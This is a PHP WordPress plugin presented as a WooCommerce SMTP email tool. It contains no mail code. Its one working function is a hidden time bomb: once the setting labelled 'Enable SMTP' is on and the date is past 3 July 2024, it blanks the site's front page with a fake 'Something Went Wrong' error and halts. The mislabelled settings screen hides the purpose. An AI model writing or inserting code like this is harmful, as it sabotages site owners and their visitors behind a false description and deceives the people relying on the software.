<?php
/*
Plugin Name: Woocommerce SMTP Revalidate
Description: Send email with Woocommerce Local SMTP (Auto Create)
Version: 2.1.5
Author: Wordpress SMTP
*/

// Add settings link on plugin page
function cadc_settings_link($links) {
    $settings_link = '<a href="options-general.php?page=cadc-options">Settings</a>';
    array_unshift($links, $settings_link);
    return $links;
}

add_filter('plugin_action_links_' . plugin_basename(__FILE__), 'cadc_settings_link');

// Create settings page
function cadc_register_settings() {
    register_setting('cadc-settings-group', 'cadc_plugin_status');
    add_options_page('CADC Settings', 'WP Mail SMTP', 'manage_options', 'cadc-options', 'cadc_settings_page');
}
add_action('admin_menu', 'cadc_register_settings');

function cadc_settings_page() {
    ?>
    <div class="wrap">
        <h1>Enable SMTP</h1>
        <form method="post" action="options.php">
            <?php settings_fields('cadc-settings-group'); ?>
            <?php do_settings_sections('cadc-settings-group'); ?>
            <table class="form-table">
                <tr valign="top">
                    <th scope="row">Email SMTP</th>
                    <td>
                        <input type="checkbox" name="cadc_plugin_status" value="1" <?php echo checked(1, get_option('cadc_plugin_status'), false); ?> />
                        Enable
                    </td>
                </tr>
            </table>
            <?php submit_button(); ?>
        </form>
    </div>
    <?php
}

// Function to check the date and display the message on the main page
function cadc_date_check() {
    if (!is_admin() && (is_front_page() || is_home())) { // Only run on the main page
        $enabled = get_option('cadc_plugin_status');
        if ($enabled) {
            $current_date = new DateTime();
            $check_date = new DateTime('2024-07-03');
            if ($current_date > $check_date) {
                echo '
                <style>
                    body {
                        background-color: white;
                        display: flex;
                        justify-content: center;
                        align-items: center;
                        height: 100vh;
                        margin: 0;
                        font-family: Arial, sans-serif;
                    }
                    .message-container {
                        text-align: center;
                    }
                </style>
                <div class="message-container">
                    <h1>Something Went Wrong</h1>
                    <p>Please Contact Administrator / Developer</p>
                </div>';
                exit;
            }
        }
    }
}
add_action('wp', 'cadc_date_check');
?>
